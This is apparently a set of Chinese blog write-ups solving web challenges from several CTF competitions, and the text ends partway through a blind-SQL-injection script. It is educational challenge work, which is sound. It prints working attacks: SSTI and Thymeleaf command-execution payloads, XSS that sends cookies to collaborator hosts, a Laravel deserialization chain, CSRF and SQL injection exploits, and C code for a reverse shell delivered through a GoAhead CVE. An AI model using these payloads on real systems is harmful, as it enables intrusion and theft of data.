[{"title":"DiceCTF@Hope-Web部分题解","url":"/2022/07/25/DiceCTF-Hope-Web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/","content":"前几天打的国外的一个小比赛，题都比较简单（歪果仁还真是喜欢nodejs啊）\nweb&#x2F;reverser主要看这一段源码，毕竟题目就post\n@app.post('/')\ndef reverse():\n    result = '''\n        &lt;link rel=\"stylesheet\" href=\"style.css\" />\n        &lt;div class=\"container\">\n            &lt;h1>Text Reverser&lt;/h1>\n            Reverse any text... now as a web service!\n            &lt;form method=\"POST\">\n                &lt;input type=\"text\" name=\"text\">\n                &lt;input type=\"submit\" value=\"Reverse\">\n            &lt;/form>\n            &lt;p>Output: %s&lt;/p>\n        &lt;/div>\n    '''\n    output = request.form.get('text', '')[::-1]\n    return render_template_string(result % output)\n\n# post传入值后会被[::-1]反转，然后render_template_string()渲染\n\n所以漏洞点当然就出在模板渲染这里\n反转脚本\noutput = '''&#123;&#123;7*7&#125;&#125;'''[::-1]\nprint(output)\n\n找一下可以用的类\nimport requests\n\nfor i in range(500):\n    url = \"https://reverser.mc.ax/\"\n    payload = \"&#123;&#123;().__class__.__bases__[0].__subclasses__()[\"+str(i)+\"]&#125;&#125;\"\n\n    print(payload)\n    output = payload[::-1]\n    res = requests.post(url=url, data=&#123;\"text\" : output&#125;)\n    # print(res.text)\n    if 'os' in res.text:\n        print(i)\n\n有一个os._wrap_close，可以命令执行final payload：\n&#125;&#125;)')(daer.)\"txt.2104ff05b00d-0669-f0a4-ead3-3883595f-galf/ppa/ tac\"(nepop.)\"so\"(__tropmi__'(]'lave'[]'__snitliub__'[__slabolg__.__tini__.]331[)(__sessalcbus__.]0[__sesab__.__ssalc__.''&#123;&#123;\n\nweb&#x2F;secure-page不知道有啥意义，直接改admin为true就完了  &#x2F;流汗\n\n\nweb&#x2F;flag-viewer&#x2F;流汗\n直接向 &#x2F;flag  post一个 user&#x3D;admin\nweb&#x2F;pastebin简单xss\n\n&#x2F;view&#x2F;下存在XSS，代码中id已经设置为Map映射\n\n这里需要一些简单的绕过\n\n正则没有开全局搜索，直接可以换行绕过，引号直接闭合掉\npayload: \n&quot;&lt;script\n&gt;\ndocument.location&#x3D;&quot;http:&#x2F;&#x2F;5u0e7wrnyjm3jfucxwgnbetv5mbcz1.burpcollaborator.net?&quot;+document.cookie;\n&lt;&#x2F;script\n&gt;&quot;\n\n发送请求建立id映射关系\n\n让flag机器人带出flag\n\n\nweb-point考点是go语言的json解析Unmarshal的特性\n相关学习文档\nhttps://cloud.tencent.com/developer/article/1515861\n这里定义一个结构体并标明 josn 的 key 为 what_point \n注意go语言中的这个json处理的 key 是不区分大小写的\n\n所以这里的waf直接用大小写绕过就行了\n\n发包满足条件即可\n\n\nweb-inspect-me该页面用js代码限制了浏览器的一些功能，并且发现用burpsuite不能抓包到源码但前端毕竟是前端，用插件破解下禁止右键，然后右键查看源码\n\n凯赛密码，用工具解密或用脚本解下就出了\nvar target = 'ubcr&#123;pyvrag_fvqr_pyvpur&#125;';\nvar flag = '';\nfor(var char of target) &#123;\n    if ('a' &lt;= char &amp;&amp; char &lt;= 'z') &#123;\n        flag += String.fromCharCode((char.charCodeAt() - 'a'.charCodeAt() + 13) % 26 + 'a'.charCodeAt());\n      &#125; else if ('A' &lt;= char &amp;&amp; char &lt;= 'Z') &#123;\n        flag += String.fromCharCode((char.charCodeAt() - 'A'.charCodeAt() + 13) % 26 + 'A'.charCodeAt());\n      &#125; else &#123;\n        flag += char;\n      &#125;\n&#125;\nconsole.log(flag);\n\n\nweb-oepssqlite注入题查询这做了限制，基本上不存在注入点，白名单限制就是狠\n\n但在插入字符串的地方并没做太多过滤，只是要求是回文串才可以\n\n用脚本构造payload\ndef createPalindrome(world):\n    stripped = world.replace(' ', '')\n    # 判断是否是回文串\n    print(world)\n    print(stripped[::-1])    \n    print(world+stripped[::-1])  \n    print(f\"insert into pending (user, sentence) values ('token', '&#123;world+stripped[::-1]&#125;');\")          \n\nif __name__ == '__main__':\n    # sqlite中的字符串连接符为 ||   注释为 --\n    createPalindrome(\"'||(select flag from flags));-\")\n\npayload:\n&#39;||(select flag from flags));--;))sgalfmorfgalftceles(||&#39;\n\n\nweb-mk一道CSP绕过的题，尝试了很久都没做出来\n尝试了很多CSP的绕过方法，参考学习\ncsp绕过姿势\nhttps://www.hetianlab.com/specialized/20210428150635\nhttps://www.freebuf.com/articles/network/272918.html\n但这题的考点题目名字已经告诉了\n题目有很直接的 https://mk.mc.ax/render?content=123 可以 render markdown 来XSS ，所以要以该链接为基础构造发给adminbot来拿到flag\n但这个CSP确实很头疼啊\n\n不过可以发现他用了MathJax 2.7.9 这个库来渲染 markdown ，翻翻 官方手册 可以发现MathJax是这样初始化的\n&lt;script type=\"text/x-mathjax-config\">\nMathJax.Hub.Config(&#123;\n  tex2jax: &#123;inlineMath: [['$','$'], ['\\\\(','\\\\)']]&#125;\n&#125;);\n&lt;/script>\n&lt;script type=\"text/javascript\" async src=\"path-to-mathjax/MathJax.js?config=TeX-AMS_CHTML\">&lt;/script>\n\n同时观察源码可以发现\n\nconfig参数可控，所以可以使用上述MathJax中 config=TeX-AMS_CHTML 的参数来执行js代码\n构造payload:\n&lt;script type=\"text/x-mathjax-config\">\nalert(1);\n&lt;/script>\n&lt;script type=\"text/javascript\" async src=\"/MathJax/MathJax.js?config=TeX-AMS_CHTML\">&lt;/script>\n\n可以发现成功弹窗\n\n代表 MathJax 会 eval 那段 code\n后续直接外带flag即可\nexp:\n&lt;script type=\"text/x-mathjax-config\">\ndocument.location = 'https://1mo9603jo3bsd2oe353vme6tikoacz.burpcollaborator.net?'+document.cookie;\n&lt;/script>\n&lt;script type=\"text/javascript\" async src=\"/MathJax/MathJax.js?config=TeX-AMS_CHTML\">&lt;/script>\n\n注意要url编码后发送\n最终payload:\nhttps:&#x2F;&#x2F;mk.mc.ax&#x2F;render?content&#x3D;%3Cscript%20type%3D%22text%2Fx-mathjax-config%22%3E%20document.location%20%3D%20&#39;https%3A%2F%2F1mo9603jo3bsd2oe353vme6tikoacz.burpcollaborator.net?&#39;%2Bdocument.cookie%3B%20%3C%2Fscript%3E%20%3Cscript%20type%3D%22text%2Fjavascript%22%20async%20src%3D%22%2FMathJax%2FMathJax.js%3Fconfig%3DTeX-AMS_CHTML%22%3E%3C%2Fscript%3E\n\n发送给adminbot即可拿到flag\n\n","categories":[],"tags":["Wp"]},{"title":"NepCtf部分web题复现","url":"/2022/07/19/NepCtf%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/","content":"Nepctf_web_Just Kiddinglaravel的框架，这个框架一般有很多反序列化的漏洞\n在控制器中找到了反序列化的点\n\n版本信息\n\n找找对应版本的CVE看看\n发现存在 CVE-2022-30778漏洞\n漏洞描述\nLaravel 9.1.8, when processing attacker-controlled data for deserialization, allows Remote Code Execution via an unserialize pop chain in __destruct in Illuminate\\Broadcasting\\PendingBroadcast.php and dispatch($command) in Illuminate\\Bus\\QueueingDispatcher.php.\n\n参考 https://xz.aliyun.com/t/11362\n可构造exp：\n&lt;?php\n\nnamespace Illuminate\\Contracts\\Queue&#123;\n\n    interface ShouldQueue &#123;&#125;\n&#125;\n\nnamespace Illuminate\\Bus&#123;\n\n    class Dispatcher&#123;\n        protected $container;\n        protected $pipeline;\n        protected $pipes = [];\n        protected $handlers = [];\n        protected $queueResolver;\n        function __construct()\n        &#123;\n            $this->queueResolver = \"system\";\n\n        &#125;\n    &#125;\n&#125;\n\nnamespace Illuminate\\Broadcasting&#123;\n\n    use Illuminate\\Contracts\\Queue\\ShouldQueue;\n\n    class BroadcastEvent implements ShouldQueue &#123;\n        function __construct() &#123;&#125;\n    &#125;\n\n    class PendingBroadcast&#123;\n        protected $events;\n        protected $event;\n        function __construct() &#123;\n            $this->event = new BroadcastEvent();\n            $this->event->connection = \"cat /flag\";\n            $this->events = new \\Illuminate\\Bus\\Dispatcher();\n        &#125;\n    &#125;\n&#125;\n\nnamespace &#123;\n    $pop = new \\Illuminate\\Broadcasting\\PendingBroadcast();\n    echo base64_encode(serialize($pop));\n&#125;\n\n得到payload\nTzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO319\n\n访问 /hello 向h3 传入参数得到flag\n\nChallenger一道简单的 Thymeleaf模板注入\n题目给了jar附件，直接解压后用IDEA打开\n\n发现/eval路由下存在lang变量可控，并且返回了lang\npayload：\n&#x2F;eval?lang&#x3D;__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat flag%22).getInputStream()).next()%7d__::.\n\n\n有关Thymeleaf模板注入的可参考学习\nhttps://www.cnpanda.net/sec/1063.html\nhttps://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-Thymeleaf-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.html\nhttps://paper.seebug.org/1332/\nhttps://xz.aliyun.com/t/9826\n","categories":[],"tags":["WP"]},{"title":"ACTF-Web部分题复现","url":"/2022/06/27/ACTF-Web%E9%A2%98%E5%A4%8D%E7%8E%B0/","content":"gogogogoahead v5.1.4 存在环境变量注⼊漏洞 （CVE-2021-42342）\n关于该漏洞网上有很多资料\nhttps://github.com/Mr-xn/CVE-2021-42342\nCVE-2021-42342 GoAhead 远程命令执行漏洞深入分析与复现 (seebug.org)\nGoAhead环境变量注入复现踩坑记 | 离别歌 (leavesongs.com)\n可上传⼀个动态链接库，然后利⽤ &#x2F;proc ⽂件系统, 将 LD_PRELOAD 环境变量设置为所上传的 so ⽂件 &#x2F;cgi-bin&#x2F; 下⾯有个脚本 hello , 可以输出环境变量\n利⽤动态链接库反弹shell（也可以直接读取flag，标准输出会出现在⻚⾯上）\nPOC1: read flag\n#include &lt;stdio.h>\n#include &lt;stdlib.h>\nstatic void read_flag(void) __attribute__((constructor));\nstatic void read_flag(void)\n&#123;\nFILE *fp = fopen(\"/flag\", \"r\");\nchar flag[256];\nfgets(flag, 256, fp);\nprintf(\"%s\\n\", flag);\nfclose(fp);\n&#125;\n\nPOC2: reverse shell\n#include&lt;stdio.h>\n#include&lt;stdlib.h>\n#include&lt;sys/socket.h>\n#include&lt;netinet/in.h>\n\nchar *server_ip=\"***\";\nuint32_t server_port=7777;\n\nstatic void reverse_shell(void) __attribute__((constructor));\nstatic void reverse_shell(void) \n&#123;\n  int sock = socket(AF_INET, SOCK_STREAM, 0);\n  struct sockaddr_in attacker_addr = &#123;0&#125;;\n  attacker_addr.sin_family = AF_INET;\n  attacker_addr.sin_port = htons(server_port);\n  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);\n  if(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!=0)\n    exit(0);\n  dup2(sock, 0);\n  dup2(sock, 1);\n  dup2(sock, 2);\n  execve(\"/bin/bash\", 0, 0);\n&#125;\n\nusage:\nstep1: gcc hack.c -fPIC -shared -o poc.so\nstep2:  curl -x 127.0.0.1:8080 -v -F data=@poc.so -F &quot;LD_PRELOAD=/proc/self/fd/7&quot; http://123.60.84.229:10218/cgi-bin/hello\n(-x设置下代理抓包爆破&#x2F;proc&#x2F;self&#x2F;fd&#x2F;x)\n可成功反弹shell\n\n这里还有一种做法\n参考https://blog.csdn.net/qq_53142368/article/details/125120520#t2\n可直接执行命令\n\nbeWhatYouWannaBe该题考查了CSRF和dom clobbering攻击\napp.js代码\nconst app = require('express')()\nconst bodyParser = require('body-parser')\nconst session = require('express-session')\nconst admin = require('./admin')\nconst mongoose = require('mongoose')\nconst rand = require('string-random')\nconst crypto = require('crypto')\n\nconst LISTEN = '0.0.0.0'\nconst PORT = 8000\nconst config = require('./config')\nconst FLAG = config.FLAG\nconst FAKE_FLAG = config.FAKE_FLAG\nconst MONGO_URL = 'mongodb://mongodb:27017/ctf'\nconst SECRET = rand(32, '0123456789abcdef')\n\n//关键部分1，检验CSRF token CSRF Token 是根据当前时间⽣成的，只要请求能在 1s 内完成应该可以直接计算出 token\nconst ValidateToken = (Token) => &#123;\n    var sha256 = crypto.createHash('sha256');\n    return sha256.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex') === Token;\n&#125;\n\nmongoose.connect(MONGO_URL)\nconst User = mongoose.model(\"users\", new mongoose.Schema(&#123;\n    username: String,\n    password: String,\n    isAdmin: Boolean\n&#125;))\n\napp.set('view engine', 'ejs')\napp.use(session(&#123;\n    secret: SECRET,\n    resave: false,\n    saveUninitialized: true,\n    cookie: &#123; secure: false &#125;,\n&#125;))\napp.use(bodyParser.urlencoded(&#123; extended: false &#125;))\napp.use(bodyParser.json())\n\napp.get('/', (req, res) => &#123;\n    res.send('hello world')\n&#125;)\n\napp.get('/login', (req, res) => &#123;\n    res.render('login', &#123;&#125;)\n&#125;)\n\n//关键部分2,可让admin发起CSRF\napp.post('/admin', (req, res) => &#123;\n    let url = req.body.url ? req.body.url : 'http://pumpk1n.com'\n    admin.view(url)\n        .then(() => &#123; res.send(url) &#125;)\n        .catch(e => &#123; res.send(e) &#125;)\n&#125;)\n\napp.get('/home', (req, res) => &#123;\n    if (!req.session.user) &#123;\n        res.redirect('/login')\n        return\n    &#125;\n    res.render('home', &#123; user: req.session.user &#125;)\n&#125;)\n\napp.post('/login', (req, res) => &#123;\n    let username = req.body.username\n    let password = req.body.password\n    console.log(\"login\", username, password)\n    if (typeof username !== 'string' || typeof password !== 'string') &#123;\n        res.render('login', &#123; error: \"wafed\" &#125;)\n        return\n    &#125;\n\n    User.find(&#123; username: username, password: password &#125;, (err, user) => &#123;\n        if (err) &#123;\n            res.render('login', &#123; error: err &#125;)\n            return\n        &#125;\n        if (user.length > 0) &#123;\n            req.session.user = username\n            res.redirect('home')\n        &#125; else &#123;\n            res.render('login', &#123; error: \"login failed\" &#125;)\n        &#125;\n    &#125;)\n&#125;)\n\napp.get('/register', (req, res) => &#123;\n    res.render('register', &#123;&#125;)\n&#125;)\n\napp.post('/register', (req, res) => &#123;\n    let username = req.body.username\n    let password = req.body.password\n    if (typeof username !== 'string' || typeof password !== 'string') &#123;\n        res.render('login', &#123; error: \"wafed\" &#125;)\n        return\n    &#125;\n    const newuser = new User(&#123;\n        username: username,\n        password: password,\n        isAdmin: false\n    &#125;)\n    User.find(&#123; username: username &#125;, (err, user) => &#123;\n        if (err) &#123;\n            res.render('register', &#123; error: err &#125;)\n            return\n        &#125;\n        if (user.length > 0) &#123;\n            res.render('register', &#123; error: \"user already exists!\" &#125;)\n        &#125; else &#123;\n            newuser.save()\n            res.redirect('login', 302)\n        &#125;\n\n    &#125;)\n&#125;)\n\n//关键部分3 ，以admin的身份让普通用户成为admin\napp.post('/beAdmin', (req, res) => &#123;\n    if (req.session.user != 'admin') &#123;\n        res.send(\"sorry, only admin can be admin\")\n        return\n    &#125;\n    const username = req.body.username\n    const csrftoken = req.body.csrftoken\n    if (ValidateToken(csrftoken)) &#123;\n        User.updateMany(&#123; username: username &#125;, &#123; isAdmin: true &#125;,\n            (err, users) => &#123;\n                if (err) &#123;\n                    res.send('something error when being admin')\n                    return\n                &#125;\n                if (users.length == 0) &#123;\n                    res.send('no one can be admin')\n                &#125; else &#123;\n                    res.send('wow success wow')\n                &#125;\n            &#125;\n        )\n    &#125; else &#123;\n        res.send('validate error')\n    &#125;\n&#125;)\n\napp.get('/flag', (req, res) => &#123;\n    if (!req.session.user) &#123;\n        res.send(FAKE_FLAG)\n        return\n    &#125;\n    User.findOne(&#123; username: req.session.user &#125;, (err, user) => &#123;\n        if (err) &#123;\n            res.send(&#123; err: err &#125;)\n            return\n        &#125;\n        if (user.isAdmin) &#123;\t\t\t\t//只要用户的user.isAdmin为True即可\n            // part 1\n            res.send(FLAG.substring(0, 16))\n        &#125; else &#123;\n            res.send(FAKE_FLAG)\n        &#125;\n    &#125;)\n&#125;)\n\napp.listen(PORT, LISTEN, () => &#123;\n    console.log(`listening $&#123;LISTEN&#125;:$&#123;PORT&#125;...`)\n&#125;)\n\nadmin.js代码\nconst puppeteer = require('puppeteer');\nconst process = require('process')\nconst ADMIN_USERNAME = 'admin'\nconst ADMIN_PASSWORD = process.env.password\nconst FLAG = require('./config').FLAG\nconst view = async(url) => &#123;\n    /**\n     * launch()该方法使用给定的arguments启动浏览器实例，当父node.js进程关闭时，浏览器将被关闭。\n     */\n    const browser = await puppeteer.launch(&#123;    //创建浏览器对象\n        headless: true,\n        args: ['--no-sandbox', '--disable-setuid-sandbox']\n    &#125;)                                          \n    const page = await browser.newPage()        //新启一个页面\n    await page.goto('http://localhost:8000/login')\n    await page.type(\"#username\", ADMIN_USERNAME)\n    await page.type(\"#password\", ADMIN_PASSWORD)\n    await page.click('#btn-login')\t\t\t\t//以admin的身份登录\n        // get flag1\n    await page.goto(url, &#123; timeout: 5000 &#125;)\n        // get flag2\n    await page.setJavaScriptEnabled(false)\n    await page.goto(url, &#123; timeout: 5000 &#125;)\n    await page.evaluate((url, FLAG) => &#123;\n        //构造相关的dom实现           dom clobbering\n        if (fff.lll.aaa.ggg.value == \"this_is_what_i_want\") &#123;\n            fetch(url + '?part2=' + btoa(encodeURIComponent(FLAG.substring(16))))\n        &#125; else &#123;\n            fetch(url + '?there_is_no_flag')\n        &#125;\n    &#125;, url, FLAG)\n    await browser.close()\n&#125;\n\nexports.view = view\n\n第一部分是常规的CSRF让admin携带着它的session触发我们给它的页面\n这里对于CSRF token的验证存在bug，只要我们在1秒内完成token计算即可绕过验证\n测试：\nconst crypto = require('crypto');\nvar sha256_1 = crypto.createHash('sha256');\nvar sha256_2 = crypto.createHash('sha256');\nvar token1 = sha256_1.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex');\nsetTimeout(() => &#123;\n    var token2 = sha256_2.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex');\n    console.log(`token1: $&#123;token1&#125;\\ntoken2: $&#123;token2&#125;`);\n    console.log(token1===token2);\n&#125;,650); \t\t\t\t//休眠650ms\n\n结果两个token是相等的\n\n所以只要在一秒内完成验证即可\nexp1:\n&lt;!DOCTYPE html>\n&lt;html>\n    &lt;head>\n        &lt;meta charset=\"UTF-8\">\n        &lt;title>CSRF&lt;/title>\n        &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js\">&lt;/script>\n    &lt;/head>\n    &lt;body>\n        &lt;form id=\"form\" action=\"http://124.71.180.254:10022/beAdmin\" method=\"post\">\n            &lt;input name=\"username\" value=\"=pankas\">\n            &lt;input id=\"csrftoken\" name=\"csrftoken\" value=\"1\">\n        &lt;/form>\n    &lt;script>\n        document.getElementById('csrftoken').value = sha256(Math.sin(Math.floor(Date.now() / 1000)).toString());\n        document.getElementById('form').submit();\n    &lt;/script>\n    &lt;/body>\n&lt;/html>\n\n挂服务器上发送链接。成为admin后即可拿到flag1\nACTF&#123;3asy_csrf_a\n\n\n\n第二部分是dom clobbering attack\n有关资料\nhttps://blog.csdn.net/qq_38154820/article/details/106330275?utm_source=app&amp;app_version=5.0.1&amp;code=app_1562916241&amp;uLinkId=usr1mkqgl919blen\nexp2:\nfrom flask import *\napp = Flask(__name__)\n@app.route('/')\ndef exp():\n    return \"\"\"\n    &lt;iframe name=fff srcdoc=\"\n    &lt;iframe name=lll srcdoc='&lt;a id=aaa>&lt;input id=aaa name=ggg value=this_is_what_i_want>'>\">&lt;/iframe>\n    \"\"\"\nif __name__ == '__main__':\n    app.run('0.0.0.0',8866)\n\n\n解码拿到第二部分\nnd_bypass_stup1d_tok3n_g3n3rator_and_use_d0m_clobberring!!!&#125;\n\nps：有些师傅可能会出现浏览器没来得及发出fetch请求，就close了的情况，可用如下方法解决（方法来自vidar的某位师傅）\n可以开⼀个 nc ，当作图⽚，卡住第⼆次⻚⾯加载\nfrom flask import *\napp = Flask(__name__)\n@app.route('/')\ndef exp():\n    return \"\"\"\n    &lt;iframe name=fff srcdoc=\"\n    &lt;iframe name=lll srcdoc='&lt;a id=aaa>&lt;input id=aaa name=ggg value=this_is_what_i_w\n    ant>'>\">&lt;/iframe>\n    &lt;img id=\"test\" src=\"http://x.x.x.x:xx\">\n    &lt;script>document.getElementById(\"test\").src=\"1\"&lt;/script>\n    \"\"\"\nif __name__ == '__main__':\n    app.run('0.0.0.0',53418)\n\n因为第⼆次访问他 ban 了 js， document.getElementById(&quot;test&quot;).src=&quot;1&quot; 就执⾏不了 了，只会在第⼆次访问卡住\n这两步其实可以和到一起的，官方exp\n&lt;html>\n\n&lt;head>\n    &lt;title>csrf&lt;/title>\n&lt;/head>\n&lt;script src=\"https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js\">&lt;/script>\n&lt;script src=\"https://cdn.bootcdn.net/ajax/libs/js-sha256/0.9.0/sha256.js\">&lt;/script>\n\n&lt;body>\n    &lt;iframe name=fff srcdoc=\"&lt;form id=lll name=aaa>&lt;input id=ggg value=this_is_what_i_want>&lt;/input>&lt;/form>&lt;form id=lll>&lt;/form>\">&lt;/iframe>\n    \n    &lt;form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\">\n        &lt;input name=\"username\" value=\"aaa\">\n        &lt;input name=\"csrftoken\" id=\"csrftoken\" value=\"1\">\n    &lt;/form>\n\n    &lt;script>\n        function getToken() &#123;\n            return sha256(Math.sin(Math.floor(Date.now() / 1000)).toString())\n        &#125;\n        $(\"#csrftoken\").attr(\"value\", getToken())\n        document.getElementById(\"form\").submit()\n    &lt;/script>\n\n&lt;/body>\n\n&lt;/html>\n\n\n\n","categories":[],"tags":["WP","ACTF"]},{"title":"miniL-web","url":"/2022/05/05/miniL-web/","content":"前言一个 愉快 的五一假期，总体来说这次minictf就web方向的题目我感觉还是有点难度的，考察范围很广泛，其中两道java相关的也是不知道怎么搞。不过有幸拿到了mini_sql的一血，还是很激动的毕竟第一次在ctf比赛中拿到一血。同时还扩展了一些密码学的东西，比如这个checkin。总之虽然排名并不是很靠前，但学到了很多有用的新姿势，血赚不亏。\n学到的新东西\nMYSQL8新特性在SQL注入中的利用\nCBC字节反转攻击\n\nmini_sql题目分析打开题目环境F12可以看到hint（当时没有看这个页面，结果为了 users 这个表名搞了很长时间，结果发现居然有hint。拿到题目一定要仔细啊，不放过任何地方）\n\n存在SQL注入，先fuzz一下看ban掉了哪些关键字符\n过滤了很多东西\n#\n$\n%\n^\n*\n+\n-\n'\n?\nselect\nunion\ninformation\nor\nand\nsubstr\nchar\nsleep\nif\n\n可以看到select都用不了，还有注释单引号什么的，但发现 \\ 并未被ban，所以根据它的sql语句可以在username处来个 \\ 转义掉后面的 &#39; 即它后端的sql语句变成了这样\nselect * from users where username='\\' and password='YOUR_INPUT';\n\n而对于最后的这个 &#39;，由于注释符被过滤了，所以可以使用 ;%00 来代替，截断后面的 &#39;\n所以后端的sql查询语句可以是 \nselect * from users where username='\\' and password='||1;%00'\n\n构造payload发送，可以发现response了 success\n\n但即便是成功登录了也没法拿到falg，测试发现其语法不出错的情况下只有 success!和 fail！两种返回值。\n基本上可以确定是要盲注了\n但问题就难在这里or、 select、 union等关键字都被ban了，很难找到突破口，但我一个习惯确帮助我解决了这道题。对于sql注入我会习惯性的去使用 database() 和 version() 去查看它当前的数据库名和版本信息。试了下发现当前数据库名为 ctf ,但好像没啥用。但这个 version 就不一样了。\n试了下payload\nusername&#x3D;\\&amp;password&#x3D;||version()&#x3D;5;%00\n\n发现竟然返回了 fail!，那就说明这是 mysql8 的版本。验证一下\n \n既然是 mysql8 那因该是有一些其它奇奇怪怪的注入姿势，结果果真有，比如说mysql8新增的 TABLE 关键字。 \n前置知识TABLE关键字(MYSQL8)翻阅mysql8的 官方文档 可以找到 TABLE 关键字的用法\nTABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]\n\n它的作用和 SELECT * FROM table_name 的作用差不多，都是列出表的整个内容\n（下文实例的所有users表内容均相同）\nmysql> TABLE users;\n+------+-----------+----------+\n| id   | username  | password |\n+------+-----------+----------+\n|    1 | admin     | qwe123   |\n|    2 | guest     | asd321   |\n|    3 | adds3awed | 12@qd24  |\n+------+-----------+----------+\n3 rows in set (0.00 sec)\n\n配合 LIMIT 关键字可以精确到某一行\nmysql> TABLE users LIMIT 0,1;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | qwe123   |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> TABLE users LIMIT 1,1;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    2 | guest    | asd321   |\n+------+----------+----------+\n1 row in set (0.01 sec)\n\nmysql> TABLE users LIMIT 1;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | qwe123   |\n+------+----------+----------+\n1 row in set (0.00 sec)\n\n还可以配合 ORDER BY 详情可以翻阅文档，这里不再赘述。\nmysql的字符串比较mysql中的字符串可以配合 () 和表的某一行进行比较，如：\nmysql> SELECT (1,'admin','qwe123')=(SELECT * FROM users LIMIT 1);\n+----------------------------------------------------+\n| (1,'admin','qwe123')=(SELECT * FROM users LIMIT 1) |\n+----------------------------------------------------+\n|                                                  1 |\n+----------------------------------------------------+\n1 row in set (0.00 sec)\n\n# MYSQL8中使用 TABLE 关键字\nmysql> SELECT (1,'admin','qwe123')=(TABLE users LIMIT 1);\n+--------------------------------------------+\n| (1,'admin','qwe123')=(TABLE users LIMIT 1) |\n+--------------------------------------------+\n|                                          1 |\n+--------------------------------------------+\n1 row in set (0.00 sec)\n\n对于字符串之间的大小比较其规则是这样的:\n不区分大小写，按照0-9a-z的ascii码大小顺序进行比较，先从两个串的第一个字符进行比较ascii值，第一个字符相同的，比较第二个字符，不同则按照  &gt; 还是 &lt; 直接返回 1或0，如果相同再比较下一个以此类推。如果前面字符全部相同，则以长度更长的为大。如：\nmysql> SELECT 'a'&lt;'C';\n+---------+\n| 'a'&lt;'C' |\n+---------+\n|       1 |\n+---------+\n1 row in set (0.00 sec)\n\nmysql> SELECT 'e'>'ef';\n+----------+\n| 'e'>'ef' |\n+----------+\n|        0 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql> SELECT 'adc'&lt;'aea';\n+-------------+\n| 'adc'&lt;'aea' |\n+-------------+\n|           1 |\n+-------------+\n1 row in set (0.00 sec)\n\nmysql> SELECT 'qwe'>'qwf';\n+-------------+\n| 'qwe'>'qwf' |\n+-------------+\n|           0 |\n+-------------+\n1 row in set (0.00 sec)\n\n\n利用括号内多个数据与表查询结果比较时，其规则是从括号内第一个参数与表的第一列数据进行比较，如果为 1 则继续比较第二个，如果为 0 则不比较后面的直接返回 0 。\nmysql> SELECT ('a','b','cd')&lt;('a','b','ce');\n+-------------------------------+\n| ('a','b','cd')&lt;('a','b','ce') |\n+-------------------------------+\n|                             1 |\n+-------------------------------+\n1 row in set (0.01 sec)\n\nmysql> SELECT ('a','b','cd')&lt;('a','b','cd');\n+-------------------------------+\n| ('a','b','cd')&lt;('a','b','cd') |\n+-------------------------------+\n|                             0 |\n+-------------------------------+\n1 row in set (0.00 sec)\n\n\nmysql> SELECT ('a','b','cd')&lt;('a','c','ab');\n+-------------------------------+\n| ('a','b','cd')&lt;('a','c','ab') |\n+-------------------------------+\n|                             1 |\n+-------------------------------+\n1 row in set (0.00 sec)\n\n\n\n和表查询结果比较\nmysql> TABLE users;\n+------+-----------+----------+\n| id   | username  | password |\n+------+-----------+----------+\n|    1 | admin     | qwe123   |\n|    2 | guest     | asd321   |\n|    3 | adds3awed | 12@qd24  |\n+------+-----------+----------+\n3 rows in set (0.00 sec)\n\nmysql> SELECT (1,'admin','')&lt;(TABLE users LIMIT 1);\n+--------------------------------------+\n| (1,'admin','')&lt;(TABLE users LIMIT 1) |\n+--------------------------------------+\n|                                    1 |\n+--------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> SELECT (1,'admin','qw')&lt;(TABLE users LIMIT 1);\n+----------------------------------------+\n| (1,'admin','qw')&lt;(TABLE users LIMIT 1) |\n+----------------------------------------+\n|                                      1 |\n+----------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> SELECT (1,'admin','qx')&lt;(TABLE users LIMIT 1);\n+----------------------------------------+\n| (1,'admin','qx')&lt;(TABLE users LIMIT 1) |\n+----------------------------------------+\n|                                      0 |\n+----------------------------------------+\n1 row in set (0.00 sec)\n\n所以可以利用这些来盲注爆破\n题解了解了上文的相关信息后这题就好解了，既然是 users 表，那一般是三个字段 id, username, password。id 第一个应该是 1 （不放心可以验证一下），后面的 username 和 password 写脚本爆破一下就好了。\n可以构造 payload :\nusername&#x3D;1\\&amp;password&#x3D;||(1,0x21,0x21)&lt;(table users limit 1);%00\n\n爆破脚本：\nimport requests\n\ndic = '_0123456789abcdefghijklmnopqrstuvwxyz'  # 字典\nurl = \"http://47.93.215.154:10000/login.php\"\n\ndef str2hex(str):\n    result = '0x'\n    for i in str:\n        result += hex(ord(i))[2:]\n    return result\n\ndef boomSql():\n    result = ''\n    for i in range(1, 40):\n        for j in range(len(dic)):\n            #print(dic[j])\n            \n            